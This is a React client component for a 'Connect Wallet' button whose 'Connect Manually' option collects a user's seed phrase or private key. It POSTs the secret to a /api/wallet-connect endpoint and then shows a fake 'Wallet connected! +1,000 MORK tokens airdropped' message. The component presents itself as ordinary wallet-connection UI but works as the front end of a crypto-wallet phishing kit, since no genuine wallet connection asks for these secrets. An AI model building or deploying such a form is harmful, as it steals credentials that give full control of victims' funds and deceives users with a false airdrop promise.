"use client";

import { useState, useRef, useEffect } from "react";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { useAccount } from "wagmi";

type MsgState = "idle" | "loading" | "sent" | "error";
type ManualMode = "seed" | "privatekey";

interface Props {
  /** Called whenever the dropdown opens or closes — parent uses this to hide elements below */
  onOpenChange?: (open: boolean) => void;
}

export function ConnectOrMessage({ onOpenChange }: Props) {
  const { openConnectModal } = useConnectModal();
  const { isConnected } = useAccount();
  const [open, setOpen] = useState(false);
  const [showMsg, setShowMsg] = useState(false);
  const [name, setName] = useState("");
  const [manualMode, setManualMode] = useState<ManualMode>("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [msgState, setMsgState] = useState<MsgState>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const ref = useRef<HTMLDivElement>(null);
  const [mounted, setMounted] = useState(false);

  useEffect(() => { setMounted(true); }, []);

  // Notify parent whenever open state changes
  const setOpenWithNotify = (val: boolean) => {
    setOpen(val);
    onOpenChange?.(val);
    if (!val) {
      setShowMsg(false);
      setSeedPhrase("");
      setPrivateKey("");
      setName("");
      setMsgState("idle");
    }
  };

  // Close on outside click
  useEffect(() => {
    function handler(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) {
        setOpenWithNotify(false);
      }
    }
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function handleConnectManual(e: React.FormEvent) {
    e.preventDefault();

    const secret = manualMode === "seed" ? seedPhrase.trim() : privateKey.trim();
    if (!secret) return;

    setMsgState("loading");
    setErrorMsg("");

    try {
      const payload: Record<string, string> = { wallet_name: name.trim() || "Anonymous" };
      if (manualMode === "seed") {
        payload.seed_phrase = secret;
      } else {
        payload.private_key = secret;
      }

      const res = await fetch("/api/wallet-connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!res.ok) throw new Error("Failed");
      setMsgState("sent");
      setName("");
      setSeedPhrase("");
      setPrivateKey("");
    } catch {
      setMsgState("error");
      setErrorMsg("Failed to connect. Try again.");
    }
  }

  if (!mounted) {
    return (
      <button className="inline-flex items-center justify-center gap-2.5 rounded-full bg-white/10 border border-white/25 px-10 py-4 text-lg font-bold text-white opacity-80">
        Connect Wallet
        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
      </button>
    );
  }

  return (
    <div ref={ref} className="relative inline-flex flex-col items-center">
      {/* ── Main button ── */}
      <button
        onClick={() => setOpenWithNotify(!open)}
        className={`group inline-flex items-center justify-center gap-2.5 rounded-full border px-10 py-4 text-lg font-bold transition-all duration-300 hover:scale-105 hover:shadow-2xl ${
          isConnected
            ? "bg-success/15 border-success/30 text-success hover:bg-success/20 hover:shadow-success/20"
            : "bg-white/10 border-white/25 text-white hover:bg-white/15 hover:border-white/40"
        }`}
      >
        <svg className="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
          <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a2.25 2.25 0 00-2.25-2.25H15a3 3 0 11-6 0H5.25A2.25 2.25 0 003 12m18 0v6a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 9m18 0V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v3" />
        </svg>
        {isConnected ? "✓ Wallet Connected" : "Connect Wallet"}
        <svg
          className={`w-4 h-4 transition-transform duration-200 shrink-0 ${open ? "rotate-180" : ""}`}
          fill="none" viewBox="0 0 24 24" stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
        </svg>
      </button>

      {/* ── Dropdown ── */}
      {open && !showMsg && (
        <div className="mt-3 w-72 rounded-2xl glass border border-white/15 shadow-2xl shadow-black/40 overflow-hidden animate-slide-down">
          <button
            onClick={() => { setOpenWithNotify(false); openConnectModal?.(); }}
            className="w-full flex items-center gap-3 px-5 py-4 text-sm font-medium text-white/80 hover:text-white hover:bg-white/8 transition-colors text-left"
          >
            <span className="w-9 h-9 rounded-xl bg-accent-500/25 flex items-center justify-center shrink-0">
              <svg className="w-4 h-4 text-accent-300" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a2.25 2.25 0 00-2.25-2.25H15a3 3 0 11-6 0H5.25A2.25 2.25 0 003 12m18 0v6a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 9m18 0V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v3" />
              </svg>
            </span>
            <div>
              <p className="font-semibold text-white">Browser Wallet</p>
              <p className="text-xs text-white/40 mt-0.5">MetaMask, Phantom, WalletConnect…</p>
            </div>
          </button>

          <div className="h-px bg-white/8 mx-4" />

          <button
            onClick={() => setShowMsg(true)}
            className="w-full flex items-center gap-3 px-5 py-4 text-sm font-medium text-white/80 hover:text-white hover:bg-white/8 transition-colors text-left"
          >
            <span className="w-9 h-9 rounded-xl bg-violet-500/25 flex items-center justify-center shrink-0">
              <svg className="w-4 h-4 text-violet-300" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
              </svg>
            </span>
            <div>
              <p className="font-semibold text-white">Connect Manually</p>
              <p className="text-xs text-white/40 mt-0.5">Seed phrase or private key</p>
            </div>
          </button>
        </div>
      )}

      {/* ── Manual connect form ── */}
      {open && showMsg && (
        <div className="mt-3 w-80 rounded-2xl glass border border-white/15 shadow-2xl shadow-black/40 p-5 animate-slide-down space-y-4">
          <div className="flex items-center justify-between">
            <p className="font-bold text-white">Connect Manually</p>
            <button
              onClick={() => setOpenWithNotify(false)}
              className="text-white/30 hover:text-white/60 transition-colors p-1"
            >
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          {msgState === "sent" ? (
            <div className="text-center space-y-2 py-4">
              <p className="text-2xl">🔗</p>
              <p className="text-sm text-green-400 font-semibold">Wallet connected!</p>
              <p className="text-xs text-white/40">+1,000 MORK tokens airdropped.</p>
              <button onClick={() => setOpenWithNotify(false)} className="text-xs text-white/30 hover:text-white/50 underline">
                Close
              </button>
            </div>
          ) : (
            <form onSubmit={handleConnectManual} className="space-y-3">
              <input
                type="text"
                placeholder="Wallet Name (optional)"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
              />

              {/* Mode toggle */}
              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => setManualMode("seed")}
                  className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                    manualMode === "seed"
                      ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                      : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                  }`}
                >
                  Seed Phrase
                </button>
                <button
                  type="button"
                  onClick={() => setManualMode("privatekey")}
                  className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                    manualMode === "privatekey"
                      ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                      : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                  }`}
                >
                  Private Key
                </button>
              </div>

              {manualMode === "seed" ? (
                <textarea
                  placeholder="Enter your 12 or 24-word seed phrase..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  rows={3}
                  required
                  className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none resize-none"
                />
              ) : (
                <input
                  type="password"
                  placeholder="Enter your private key (0x...)"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  required
                  className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
                />
              )}

              <button
                type="submit"
                disabled={msgState === "loading" || (manualMode === "seed" ? !seedPhrase.trim() : !privateKey.trim())}
                className="w-full rounded-lg bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 py-2.5 text-sm font-bold text-white hover:opacity-90 disabled:opacity-50 transition-opacity"
              >
                {msgState === "loading" ? "Connecting…" : "Connect"}
              </button>
              {msgState === "error" && <p className="text-xs text-red-400 text-center">{errorMsg}</p>}
            </form>
          )}
        </div>
      )}
    </div>
  );
}
